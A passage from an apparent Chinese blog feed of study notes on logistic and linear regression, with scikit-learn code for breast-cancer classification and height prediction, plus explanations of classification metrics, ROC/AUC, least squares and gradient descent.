title="逻辑回归原理"></a>逻辑回归原理</h2><p><strong>学习目标</strong><br>1.理解逻辑回归算法的原理</p><p>2.知道逻辑回归的损失函数</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>逻辑回归概念 Logistic Regression</p><p>• 一种分类模型，把线性回归的输出，作为逻辑回归的输入。 </p><p>• 输出是(0, 1)之间的值</p><p>• 基本思想</p><ol><li>利用线性模型 f(x) &#x3D; wx + b 根据特征的重要性计算出一个值</li><li>再使用 sigmoid 函数将 f(x) 的输出值映射为概率值<ol><li>设置阈值(eg:0.5)，输出概率值大于 0.5，则将未知样本输出为 1 类</li><li>否则输出为 0 类</li></ol></li></ol><p>3.逻辑回归的假设函数<br> h(w) &#x3D; sigmoid(wx + b )</p><p>线性回归的输出，作为逻辑回归的输入</p><p>​      </p><p><strong>在逻辑回归中，当预测结果不对的时候，我们该怎么衡量其损失呢？</strong></p><p>我们来看下图(下图中，设置阈值为0.6)，</p><p><img src="/2025/05/09/%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92/image-20220121161828121.png" alt="image-20220121161828121"> </p><p>那么如何去衡量逻辑回归的预测结果与真实结果的差异？</p><h3 id="损失函数"><a href="#损失函数" class="headerlink" title="损失函数"></a>损失函数</h3><p><img src="/2025/05/09/%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92/image-20230904151300483.png" alt="image-20230904151300483"></p><p><img src="/2025/05/09/%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92/image-20230904151334262.png" alt="image-20230904151334262"></p><p><img src="/2025/05/09/%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92/image-20230904151343779.png" alt="image-20230904151343779"></p><h2 id="逻辑回归API"><a href="#逻辑回归API" class="headerlink" title="逻辑回归API"></a>逻辑回归API</h2><h3 id="API介绍"><a href="#API介绍" class="headerlink" title="API介绍"></a>API介绍</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sklearn.linear_model.LogisticRegression(solver=<span class="string">&#x27;liblinear&#x27;</span>, penalty=‘l2’, C = <span class="number">1.0</span>)</span><br></pre></td></tr></table></figure><p><strong>solver</strong> <strong>损失函数优化方法</strong>:</p><p>训练速度:liblinear 对小数据集场景训练速度更快，sag 和 saga 对大数据集更快一些。 2 正则化:</p><ol><li>newton-cg、lbfgs、sag、saga 支持 L2 正则化或者没有正则化</li><li>2liblinear 和 saga 支持 L1 正则化</li></ol><p><strong>penalty</strong>:正则化的种类，l1 或者 l2</p><p><strong>C</strong>:正则化力度</p><p>默认将类别数量少的当做正例</p><h3 id="癌症分类案例"><a href="#癌症分类案例" class="headerlink" title="癌症分类案例"></a>癌症分类案例</h3><ul><li>数据介绍</li></ul><p>（1）699条样本，共11列数据，第一列用语检索的id，后9列分别是与肿瘤相关的医学特征，</p><p>​     最后一列表示肿瘤类型的数值。</p><p>（2）包含16个缺失值，用”?”标出。</p><p>（3）2表示良性，4表示恶性</p><blockquote><p>数据描述</p><p>（1）699条样本，共11列数据，第一列用语检索的id，后9列分别是与肿瘤</p><p>相关的医学特征，最后一列表示肿瘤类型的数值。</p><p>（2）包含16个缺失值，用”?”标出。</p></blockquote><p>​</p><ul><li>案例分析</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.获取数据</span><br><span class="line">2.基本数据处理</span><br><span class="line">2.1 缺失值处理</span><br><span class="line">2.2 确定特征值,目标值</span><br><span class="line">2.3 分割数据</span><br><span class="line">3.特征工程(标准化)</span><br><span class="line">4.机器学习(逻辑回归)</span><br><span class="line">5.模型评估</span><br></pre></td></tr></table></figure><ul><li>代码实现</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 0.导包</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> StandardScaler</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LogisticRegression</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> accuracy_score</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.加载数据</span></span><br><span class="line">data =pd.read_csv(<span class="string">&#x27;breast-cancer-wisconsin.csv&#x27;</span>)</span><br><span class="line"><span class="comment"># print(data.info())</span></span><br><span class="line"><span class="comment"># 2.数据处理</span></span><br><span class="line"><span class="comment"># 2.1 缺失值</span></span><br><span class="line">data =data.replace(to_replace=<span class="string">&#x27;?&#x27;</span>,value=np.NAN)</span><br><span class="line">data=data.dropna()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.2 获取特征和目标值</span></span><br><span class="line">X = data.iloc[:,<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">y = data[<span class="string">&#x27;Class&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.3 数据划分</span></span><br><span class="line">x_train,x_test,y_train,y_test=train_test_split(X,y,test_size=<span class="number">0.2</span>,random_state=<span class="number">22</span>)</span><br><span class="line"><span class="comment"># 3.特征工程(标准化)</span></span><br><span class="line">pre =StandardScaler()</span><br><span class="line">x_train=pre.fit_transform(x_train)</span><br><span class="line">x_test=pre.transform(x_test)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.模型训练</span></span><br><span class="line">model=LogisticRegression()</span><br><span class="line">model.fit(x_train,y_train)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5.模型预测和评估</span></span><br><span class="line">y_predict =model.predict(x_test)</span><br><span class="line"><span class="built_in">print</span>(y_predict)</span><br><span class="line"><span class="built_in">print</span>(accuracy_score(y_test,y_predict))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="分类评估方法"><a href="#分类评估方法" class="headerlink" title="分类评估方法"></a>分类评估方法</h2><h3 id="混淆矩阵"><a href="#混淆矩阵" class="headerlink" title="混淆矩阵"></a>混淆矩阵</h3><style>.ogmqxflecgxo{zoom:50%;}</style><img src="/2025/05/09/%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92/image-20230904162952115.png" class="ogmqxflecgxo" alt="image-20230904162952115"><p>混淆矩阵作用在测试集样本集中：</p><ol><li>真实值是 <strong>正例</strong> 的样本中，被分类为 <strong>正例</strong> 的样本数量有多少，这部分样本叫做真正例（TP，True Positive）</li><li>真实值是 <strong>正例</strong> 的样本中，被分类为 <strong>假例</strong> 的样本数量有多少，这部分样本叫做伪反例（FN，False Negative）</li><li>真实值是 <strong>假例</strong> 的样本中，被分类为 <strong>正例</strong> 的样本数量有多少，这部分样本叫做伪正例（FP，False Positive）</li><li>真实值是 <strong>假例</strong> 的样本中，被分类为 <strong>假例</strong> 的样本数量有多少，这部分样本叫做真反例（TN，True Negative）</li></ol><blockquote><p>True Positive ：表示样本真实的类别<br>Positive ：表示样本被预测为的类别</p></blockquote><h3 id="Precision（精确率）"><a href="#Precision（精确率）" class="headerlink" title="Precision（精确率）"></a>Precision（精确率）</h3><p>精确率也叫做查准率，指的是对正例样本的预测准确率。比如：我们把恶性肿瘤当做正例样本，则我们就需要知道模型对恶性肿瘤的预测准确率。</p><style>.cobomvrqukxk{zoom:50%;}</style><h3 id="Recall（召回率）"><a href="#Recall（召回率）" class="headerlink" title="Recall（召回率）"></a>Recall（召回率）</h3><p>召回率也叫做查全率，指的是预测为真正例样本占所有真实正例样本的比重。例如：我们把恶性肿瘤当做正例样本，则我们想知道模型是否能把所有的恶性肿瘤患者都预测出来。</p><img src="images/06.png" /><h3 id="F1-score"><a href="#F1-score" class="headerlink" title="F1-score"></a>F1-score</h3><p>如果我们对模型的精度、召回率都有要求，希望知道模型在这两个评估方向的综合预测能力如何？则可以使用 F1-score 指标。</p><style>.ngviawueogtb{}</style><p><strong>Precision &#x2F; Recall &#x2F;F1-score</strong></p><p><img src="/2025/05/09/%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92/image-20240801120746646.png" alt="image-20240801120746646"></p><h3 id="ROC曲线和AUC指标"><a href="#ROC曲线和AUC指标" class="headerlink" title="ROC曲线和AUC指标"></a>ROC曲线和AUC指标</h3><h4 id="ROC-曲线"><a href="#ROC-曲线" class="headerlink" title="ROC 曲线"></a>ROC 曲线</h4><p>ROC 曲线：我们分别考虑正负样本的情况：</p><ol><li>正样本中被预测为正样本的概率，即：TPR （True Positive Rate）</li><li>负样本中被预测为正样本的概率，即：FPR （False Positive Rate）</li></ol><style>.kkelyihdwtvb{zoom: 80%;}</style><img src="/2025/05/09/%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92/image-20230904182146483.png" class="kkelyihdwtvb" alt="image-20230904182146483"><p>ROC 曲线图像中，4 个特殊点的含义：</p><ol><li>(0, 0) 表示所有的正样本都预测为错误，所有的负样本都预测正确</li><li>(1, 0) 表示所有的正样本都预测错误，所有的负样本都预测错误</li><li>(1, 1) 表示所有的正样本都预测正确，所有的负样本都预测错误</li><li>(0, 1) 表示所有的正样本都预测正确，所有的负样本都预测正确</li></ol><p><img src="/images/image-20240801152804626.png" alt="image-20240801152804626"></p><h4 id="绘制-ROC-曲线"><a href="#绘制-ROC-曲线" class="headerlink" title="绘制 ROC 曲线"></a>绘制 ROC 曲线</h4><p>假设：在网页某个位置有一个广告图片或者文字，该广告共被展示了 6 次，有 2 次被浏览者点击了。每次点击的概率如下：</p><table><thead><tr><th align="center">样本</th><th align="center">是否被点击</th><th align="center">预测点击概率</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">1</td><td align="center">0.9</td></tr><tr><td align="center">2</td><td align="center">0</td><td align="center">0.7</td></tr><tr><td align="center">3</td><td align="center">1</td><td align="center">0.8</td></tr><tr><td align="center">4</td><td align="center">0</td><td align="center">0.6</td></tr><tr><td align="center">5</td><td align="center">0</td><td align="center">0.5</td></tr><tr><td align="center">6</td><td align="center">0</td><td align="center">0.4</td></tr></tbody></table><p>根据预测点击概率排序之后：</p><table><thead><tr><th align="center">样本</th><th align="center">是否被点击</th><th align="center">预测点击概率</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">1</td><td align="center">0.9</td></tr><tr><td align="center">3</td><td align="center">1</td><td align="center">0.8</td></tr><tr><td align="center">2</td><td align="center">0</td><td align="center">0.7</td></tr><tr><td align="center">4</td><td align="center">0</td><td align="center">0.6</td></tr><tr><td align="center">5</td><td align="center">0</td><td align="center">0.5</td></tr><tr><td align="center">6</td><td align="center">0</td><td align="center">0.4</td></tr></tbody></table><p>绘制 ROC 曲线：</p><p><strong>阈值：0.9</strong></p><ol><li>原本为正例的 1、3 号的样本中 3 号样本被分类错误，则 TPR &#x3D; 1&#x2F;2 &#x3D; 0.5</li><li>原本为负例的 2、4、5、6 号样本没有一个被分为正例，则 FPR &#x3D; 0</li></ol><p><strong>阈值：0.8</strong></p><ol><li>原本为正例的 1、3 号样本被分类正确，则 TPR &#x3D; 2&#x2F;2 &#x3D; 1</li><li>原本为负例的 2、4、5、6 号样本没有一个被分为正例，则 FPR &#x3D; 0</li></ol><p><strong>阈值：0.7</strong></p><ol><li>原本为正例的 1、3 号样本被分类正确，则 TPR &#x3D; 2&#x2F;2 &#x3D; 1</li><li>原本为负类的 2、4、5、6 号样本中 2 号样本被分类错误，则 FPR &#x3D; 1&#x2F;4 &#x3D; 0.25</li></ol><p><strong>阈值：0.6</strong></p><ol><li>原本为正例的 1、3 号样本被分类正确，则 TPR &#x3D; 2&#x2F;2 &#x3D; 1</li><li>原本为负类的 2、4、5、6 号样本中 2、4 号样本被分类错误，则 FPR &#x3D; 2&#x2F;4 &#x3D; 0.5</li></ol><p><strong>阈值：0.5</strong></p><ol><li>原本为正例的 1、3 号样本被分类正确，则 TPR &#x3D; 2&#x2F;2 &#x3D; 1</li><li>原本为负类的 2、4、5、6 号样本中 2、4、5 号样本被分类错误，则 FPR &#x3D; 3&#x2F;4 &#x3D; 0.75</li></ol><p><strong>阈值 0.4</strong></p><ol><li>原本为正例的 1、3 号样本被分类正确，则 TPR &#x3D; 2&#x2F;2 &#x3D; 1</li><li>原本为负类的 2、4、5、6 号样本全部被分类错误，则 FPR &#x3D; 4&#x2F;4 &#x3D; 1</li></ol><p>(0, 0.5)、(0, 1)、(0.25, 1)、(0.5, 1)、(0.75, 1)、(1, 1)</p><p>由 TPR 和 FPR 构成的 ROC 图像为：</p><style>.veeszignsolm{zoom: 50%;}</style><img src="/2025/05/09/%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92/image-20230914105309023.png" class="veeszignsolm" alt="image-20230914105309023"><h4 id="AUC-值"><a href="#AUC-值" class="headerlink" title="AUC 值"></a>AUC 值</h4><ol><li>我们发现：图像越靠近 (0,1) 点则模型对正负样本的辨别能力就越强</li><li>我们发现：图像越靠近 (0, 1) 点则 ROC 曲线下面的面积就会越大</li><li>AUC 是 ROC 曲线下面的面积，该值越大，则模型的辨别能力就越强</li><li>AUC  范围在 [0, 1] 之间</li><li>当 AUC&#x3D; 1 时，该模型被认为是完美的分类器，但是几乎不存在完美分类器</li></ol><blockquote><p>AUC 值主要评估模型对正例样本、负例样本的辨别能力.</p></blockquote><h4 id="分类评估报告api"><a href="#分类评估报告api" class="headerlink" title="分类评估报告api"></a><strong>分类评估报告api</strong></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sklearn.metrics.classification_report(y_true, y_pred, labels=[], target_names=<span class="literal">None</span> )</span><br><span class="line">  <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  y_true：真实目标值</span></span><br><span class="line"><span class="string">  y_pred：估计器预测目标值</span></span><br><span class="line"><span class="string">  labels:指定类别对应的数字</span></span><br><span class="line"><span class="string">  target_names：目标类别名称</span></span><br><span class="line"><span class="string">  return：每个类别精确率与召回率</span></span><br><span class="line"><span class="string">  &#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="AUC计算API"><a href="#AUC计算API" class="headerlink" title="AUC计算API"></a><strong>AUC计算API</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from sklearn.metrics import roc_auc_score</span><br><span class="line">  sklearn.metrics.roc_auc_score(y_true, y_score)</span><br><span class="line">    计算ROC曲线面积，即AUC值</span><br><span class="line">    y_true：每个样本的真实类别，必须为0(反例),1(正例)标记</span><br><span class="line">    y_score：预测得分，可以是正例的估计概率、置信值或者分类器方法的返回值</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 大模型 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>线性回归</title>
      <link href="/2025/05/01/%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/"/>
      <url>/2025/05/01/%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/</url>
      
        <content type="html"><![CDATA[<h1 id="线性回归"><a href="#线性回归" class="headerlink" title="线性回归"></a>线性回归</h1><h1 id="线性回归介绍"><a href="#线性回归介绍" class="headerlink" title="线性回归介绍"></a>线性回归介绍</h1><h3 id="线性回归-1"><a href="#线性回归-1" class="headerlink" title="线性回归"></a>线性回归</h3><p>线性回归(Linear regression)是利用 <strong>回归方程(函数)</strong> 对 <strong>一个或多个自变量(特征值)和因变量(目标值)之间</strong> 关系进行建模的一种分析方式。</p><p><img src="/2025/02/19/BurtSuite%E7%9A%84%E5%BA%94%E7%94%A8/230901102250602.png" alt="image-20230901102250602"></p><style>.xbartxobetjd{zoom:150%;}</style><p>注意事项：</p><ul><li><p>求解的w，都是<strong>w的零次幂</strong>，所以叫线性模型</p></li><li><p>在线性回归中，从数据中获取的<strong>规律</strong>其实就是<strong>学习权重系数w</strong></p></li><li><p>某一个权重值<strong>w越大</strong>，说明这个权重的数据<strong>影响越大</strong></p></li></ul><h3 id="线性回归分类"><a href="#线性回归分类" class="headerlink" title="线性回归分类"></a>线性回归分类</h3><ul><li>一元线性回归：y &#x3D; kx +b</li></ul><p>目标值只与一个<strong>因变量</strong>有关系</p><ul><li>多元线性回归：</li></ul><p><img src="/2025/02/19/BurtSuite%E7%9A%84%E5%BA%94%E7%94%A8/230901102940614.png" alt="image-20230901102940614"></p><p>目标值只与<strong>多个因变量</strong>有关系</p><h1 id="线归问题求解"><a href="#线归问题求解" class="headerlink" title="线归问题求解"></a>线归问题求解</h1><h3 id="线归API的应用"><a href="#线归API的应用" class="headerlink" title="线归API的应用"></a>线归API的应用</h3><p>预测身高</p><p>已知数据:</p><p><img src="/2025/02/19/BurtSuite%E7%9A%84%E5%BA%94%E7%94%A8/230901104147248.png" alt="image-20230901104147248"></p><p><img src="/2025/02/19/BurtSuite%E7%9A%84%E5%BA%94%E7%94%A8/230901104237860.png" alt="image-20230901104237860"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 导入线性回归包</span></span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LinearRegression</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">predict_height</span>():</span><br><span class="line">    <span class="comment"># 2. 准备数据（身高cm和体重kg）</span></span><br><span class="line">    x = [[<span class="number">160</span>], [<span class="number">165</span>], [<span class="number">172</span>], [<span class="number">174</span>],[<span class="number">180</span>]]  <span class="comment"># 二维特征数据</span></span><br><span class="line">    y = [<span class="number">56.3</span>, <span class="number">60.6</span>, <span class="number">65.1</span>, <span class="number">68.5</span>, <span class="number">75</span>]         <span class="comment"># 标签数据</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 3. 实例化线性回归模型</span></span><br><span class="line">    estimator = LinearRegression()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 4. 训练线性回归模型</span></span><br><span class="line">    estimator.fit(x, y)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 打印模型参数</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;estimator.coef_:&#x27;</span>, estimator.coef_)       <span class="comment"># 系数w</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;estimator.intercept_:&#x27;</span>, estimator.intercept_)  <span class="comment"># 截距b</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 5. 模型预测</span></span><br><span class="line">    myres = estimator.predict([[<span class="number">176</span>]])  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;myres-&gt;&#x27;</span>, myres)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行函数</span></span><br><span class="line">predict_height()</span><br></pre></td></tr></table></figure><h3 id="损失函数-代价函数"><a href="#损失函数-代价函数" class="headerlink" title="损失函数(代价函数)"></a>损失函数(代价函数)</h3><p>想求一条直线<strong>更好的拟合所有点</strong><br>$$<br>y &#x3D; kx + b<br>$$</p><ul><li><p>引入损失函数(衡量预测值和真实值效果) Loss(k, b) </p></li><li><p>通过一个优化方法，求损失函数最小值，得到K最优解</p></li></ul><p><img src="/2025/02/19/BurtSuite%E7%9A%84%E5%BA%94%E7%94%A8/230901110253313.png" alt="image-20230901110253313"></p><ol><li><p><strong>误差概念</strong>：用 <strong>[预测值y – 真实值y]</strong> 就是<strong>误差</strong></p></li><li><p><strong>损失函数</strong>：衡量每个样本预测值与真实值效果的函数</p></li><li><p>“<strong>红色直线</strong>能更好的拟合所有点”也就是<strong>误差最小</strong>，<strong>误差和最小</strong></p></li></ol><p><img src="/./assets/%7BA6ABC670-3838-4E8E-AB69-28FDB106F7AE%7D.png" alt="{A6ABC670-3838-4E8E-AB69-28FDB106F7AE}"></p><p><img src="/./assets/%7BA6ABC670-3838-4E8E-AB69-28FDB106F7AE%7D.png" alt="{A6ABC670-3838-4E8E-AB69-28FDB106F7AE}"></p><p><strong>损失函数</strong>是关于<strong>𝑘、𝑏</strong>的函数，展开会变成<strong>二元二次方程</strong>。 为简化计算，先固定截距𝑏 ,<strong>x&#x3D;0时</strong>，𝑏可设置成一个负值，<strong>𝑏 固定成-100</strong></p><p>当损失函数取最小值时，得到k就是最优解</p><p><img src="/./assets/%7BC6F1ED4F-01F8-4E67-95D6-75E5080FE7A0%7D.png" alt="{C6F1ED4F-01F8-4E67-95D6-75E5080FE7A0}"></p><img src="./assets/{217B33E7-CA3C-4F48-830D-1AAD43F8FF09}.png" alt="{217B33E7-CA3C-4F48-830D-1AAD43F8FF09}" style="zoom:80%;" /><p>回归的损失函数：</p><img src="./assets/{C37267B6-9F40-4AF6-B323-6750DB145606}.png" alt="{C37267B6-9F40-4AF6-B323-6750DB145606}" style="zoom:50%;" /><img src="./assets/{1C6A59EE-DB05-4790-A218-DF2E44ED3E9E}.png" alt="{1C6A59EE-DB05-4790-A218-DF2E44ED3E9E}" style="zoom:80%;" /><h3 id="导数和矩阵"><a href="#导数和矩阵" class="headerlink" title="导数和矩阵"></a>导数和矩阵</h3><h4 id="常见的数据表述"><a href="#常见的数据表述" class="headerlink" title="常见的数据表述"></a>常见的数据表述</h4><ul><li><p><strong>标量scalar</strong> :一个独立存在的数，只有大小没有方向</p></li><li><p><strong>向量vector</strong> :向量指一列顺序排列的元素。默认是列向量</p></li><li><p><strong>矩阵matrix</strong> :二维数组</p><p><img src="/images/image-20230901115232323.png" alt="image-20230901115232323"></p></li><li><p><strong>张量Tensor</strong> :多维数组，张量是基于<strong>向量和矩阵的推广</strong></p><p><img src="/images/image-20230901115246275.png" alt="image-20230901115246275"></p></li></ul><h4 id="导数"><a href="#导数" class="headerlink" title="导数"></a>导数</h4><p>高数上定义</p><p><img src="/images/%E5%AF%BC%E6%95%B0.jpeg"></p><p>导数是函数的局部性质。一个函数在某一点的导数描述了这个函数在这一点附近的变化率。</p><p>函数在某一点的导数就是该函数所代表的曲线在这一点上的切线斜率</p><p><strong>需掌握的</strong></p><ul><li>常见求导公式</li></ul><p><img src="/images/image-20240731191353155-17224246394383.png" alt="image-20240731191353155"></p><ul><li><p>四则运算</p></li><li><p>复合函数求导</p></li><li><p>导数求极值：导数为0的位置是函数的极值点</p></li></ul><h4 id="偏导"><a href="#偏导" class="headerlink" title="偏导"></a>偏导</h4><p><img src="/images/image-20230901144053678.png" alt="image-20230901144053678"></p><p><img src="/images/image-20230901144102962.png" alt="image-20230901144102962"></p><h4 id="向量"><a href="#向量" class="headerlink" title="向量"></a>向量</h4><ul><li>有大小方向</li><li>线性运算</li><li>转置(Transpose)</li><li>范数(norm)：基本概念，具有长度的意义<ul><li>1范数(L1范数)：向量中各个元素<strong>绝对值之和</strong></li><li>2范数(L2范数)：向量的模长，各个元素<strong>平方求和开根号</strong></li><li>p范数(Lp范数)：向量各个元素<strong>p次幂求和，开p次根</strong></li></ul></li></ul><p><img src="/./assets/%7B35ADFD6C-D1C7-4863-A57C-B1E4F9CF615E%7D.png" alt="{35ADFD6C-D1C7-4863-A57C-B1E4F9CF615E}"></p><h4 id="矩阵"><a href="#矩阵" class="headerlink" title="矩阵"></a>矩阵</h4><ul><li><p>机器学习中的表达：</p><p><img src="/./assets/%7B20EDA20B-2FBC-4489-AFFC-35FE57BFB561%7D.png" alt="{20EDA20B-2FBC-4489-AFFC-35FE57BFB561}"></p></li><li><p>线性、乘法运算，乘法性质</p></li><li><p>转置极其性质</p><p><img src="/./assets/%7B2B607A6E-3282-49A7-B989-D36CFF2B39CE%7D.png" alt="{2B607A6E-3282-49A7-B989-D36CFF2B39CE}"></p></li><li><p>矩阵@矩阵的转置</p><p><img src="/./assets/%7BE0CB5276-6AF5-4A5C-A88A-78899D52F00F%7D.png" alt="{E0CB5276-6AF5-4A5C-A88A-78899D52F00F}"></p></li><li><p>方针、单位阵</p></li><li><p>逆矩阵</p></li></ul><p><img src="/images/image-20230901145840373.png" alt="image-20230901145840373"></p><p><img src="/images/image-20230901150113602.png" alt="image-20230901150113602"></p><h3 id="一元线性回归的解析解"><a href="#一元线性回归的解析解" class="headerlink" title="一元线性回归的解析解"></a>一元线性回归的解析解</h3><p><img src="/images/image-20230901150406897.png" alt="image-20230901150406897"></p><p><img src="/./assets/image-20250421195422133.png" alt="image-20250421195422133"></p><p><strong>步骤</strong></p><ul><li>用<strong>最小二乘法</strong>列出<strong>二元函数</strong></li><li>分别对<strong>k和b求偏导</strong></li><li>代入数据计算<strong>解出k和b</strong></li><li>得到<strong>预测值</strong></li></ul><h3 id="多元线性回归-正规方程法"><a href="#多元线性回归-正规方程法" class="headerlink" title="多元线性回归-正规方程法"></a>多元线性回归-正规方程法</h3><p><img src="/./assets/image-20250421203032773.png" alt="image-20250421203032773"></p><ul><li>损失函数普通方式转成矩阵方式</li></ul><p>$$<br>J(w) &#x3D; \sum_{i&#x3D;1}^m \left( h(x_i) - y_i \right)^2 &#x3D; | Xw - y |_2^2<br>$$</p><p><strong>Step 1：展开形式</strong><br>$$<br>J(w) &#x3D; \underbrace{(h(x_1) - y_1)^2}<em>{\text{样本1的误差}} + \underbrace{(h(x_2) - y_2)^2}</em>{\text{样本2的误差}} + \cdots + \underbrace{(h(x_m) - y_m)^2}_{\text{样本m的误差}}<br>$$</p><p><strong>Step 2：求和符号简写</strong><br>$$<br>J(w) &#x3D; \sum_{i&#x3D;1}^m \left( h(x_i) - y_i \right)^2<br>$$</p><p><strong>Step 3：矩阵形式转换</strong><br>$$<br>J(w) &#x3D; | Xw - y |_2^2<br>$$</p><p>• 推导过程：</p><ol><li><p>设计矩阵构造：<br>将所有样本特征  xi 堆叠成设计矩阵<br>$$<br>X \in \mathbb{R}^{m \times n}<br>$$<br>其中：<br>$$<br>X &#x3D; \begin{bmatrix}<br>x_1^T \<br>x_2^T \<br>\vdots \<br>x_m^T<br>\end{bmatrix}, \quad<br>y &#x3D; \begin{bmatrix}<br>y_1 \<br>y_2 \<br>\vdots \<br>y_m<br>\end{bmatrix}<br>$$</p></li><li><p>预测向量表示：<br>$$<br>Xw &#x3D; \begin{bmatrix}<br>   x_1^T w \<br>   x_2^T w \<br>   \vdots \<br>   x_m^T w<br>   \end{bmatrix} &#x3D; \begin{bmatrix}<br>   h(x_1) \<br>   h(x_2) \<br>   \vdots \<br>   h(x_m)<br>   \end{bmatrix}<br>$$</p></li><li><p>向量差与范数：  </p><p>  $$<br>  | Xw - y |<em>2^2 &#x3D; (Xw - y)^T (Xw - y) &#x3D; \sum</em>{i&#x3D;1}^m (h(x_i) - y_i)^2<br>  $$</p></li></ol><p>$$<br>J(w) &#x3D; (h(x_1)−y_1)^2 + (h(x_2)−y_2)^2 + \cdots + (h(x_m)−y_m)^2 \<br>&#x3D; \sum_{i&#x3D;1}^m (h(x_i) − y_i)^2 &#x3D; | Xw − y |_2^2<br>$$</p><hr><p><img src="/images/image-20230911234116911.png" alt="image-20230911234116911"></p><p><img src="/images/image-20230901152745308.png" alt="image-20230901152745308"></p><p><img src="/images/image-20230901152758396.png" alt="image-20230901152758396"></p><h3 id="梯度下降算法"><a href="#梯度下降算法" class="headerlink" title="梯度下降算法"></a>梯度下降算法</h3><h4 id="梯度下降思想"><a href="#梯度下降思想" class="headerlink" title="梯度下降思想"></a>梯度下降思想</h4><ul><li>求解函数极值还有更通用的方法就是<strong>梯度下降法</strong>。顾名思义：<strong>沿着梯度下降的方向</strong>求解极小值</li></ul><p><img src="/images/image-20230901183007785.png" alt="image-20230901183007785"></p><ul><li>输入：初始化位置S;每步距离为a 。输出:从位置S到达山底</li><li>步骤1：令初始化位置为山的任意位置S</li><li>步骤2：在当前位置环顾四周，如果四周都比S高返回S;否则执行步骤3</li><li>步骤3：在当前位置环顾四周，寻找坡度最陡的方向，令其为x方向</li><li>步骤4：沿着x方向往下走，长度为a，到达新的位置S‘ </li><li>步骤5：在S‘位置环顾四周，如果四周都比 S‘ 高，则返回S‘ 。否则转到步骤3</li></ul><p>小结:通过<strong>循环迭代</strong>的方法<strong>不断更新位置S</strong> (相当于<strong>不断更新权重参数w</strong>)</p><p><img src="/images/image-20230901183020726.png" alt="image-20230901183020726"></p><p> 最终找到最优解，这个方法可用来求损失函数最优解， 比<strong>正规方程更通用</strong></p><blockquote><p>梯度下降过程就和下山场景类似可微分的损失函数，代表着一座山<br>寻找的函数的最小值，也就是山底</p></blockquote><ul><li><p>什么是梯度</p><ul><li>单变量函数中，梯度就是<strong>某一点切线斜率</strong>（某一点的导数）；梯度方向为<strong>函数增长最快的方向</strong></li><li>多变量函数中，梯度就是<strong>某一个点的偏导数</strong>；有方向：偏导数分量的<strong>向量方向</strong></li></ul></li><li><p>梯度下降公式</p><p><img src="/./assets/%7B85FD3246-F8A8-4397-A7CE-E5083E723E4F%7D.png" alt="{85FD3246-F8A8-4397-A7CE-E5083E723E4F}"></p><ul><li>α：<strong>学习率(步长)</strong>， 不能太大, 也不能太小. 机器学习中：<strong>0.001 ~ 0.01</strong> </li><li>梯度是<strong>上升最快</strong>的方向, 我们需要是下降最快的方向, 所以<strong>需要加负号</strong></li></ul></li><li><p>举个栗子</p></li></ul><p><img src="/./assets/%7BBDE650B1-A2EB-4E9A-A2FB-83919B2F683B%7D.png" alt="{BDE650B1-A2EB-4E9A-A2FB-83919B2F683B}"></p><p><img src="/./assets/%7B854E4731-DD44-4C5B-A14E-E7DBD717C574%7D.png" alt="{854E4731-DD44-4C5B-A14E-E7DBD717C574}"></p><ul><li>步长<ul><li>步长决定了在梯度下降迭代的过程中，每一步沿梯度<strong>负方向</strong>前进的长度 </li><li>2.学习率太小，下降的<strong>速度会慢</strong>  </li><li>3.学习率太大：容易造成<strong>错过最低点</strong>、产生下降过程中的震荡、甚至<strong>梯度爆炸</strong></li></ul></li></ul><h4 id="银行信贷案例"><a href="#银行信贷案例" class="headerlink" title="银行信贷案例"></a>银行信贷案例</h4><p><img src="/images/image-20230901183222050.png" 